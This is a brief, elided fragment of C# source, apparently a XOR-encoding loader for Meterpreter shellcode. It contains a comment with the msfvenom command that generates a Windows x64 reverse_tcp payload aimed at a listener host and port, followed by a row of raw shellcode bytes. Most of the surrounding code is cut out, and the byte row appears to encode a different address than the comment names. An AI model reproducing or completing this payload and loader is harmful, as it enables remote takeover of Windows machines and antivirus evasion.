...
namespace XorCoder
{
    public class Program
    {
        ...
        {
            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=8080 EXITFUNC=thread -f csharp -o csharp.txt
            ...
            0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0x31,0x76,0x41,0x54,0x49,0x89,0xe4,
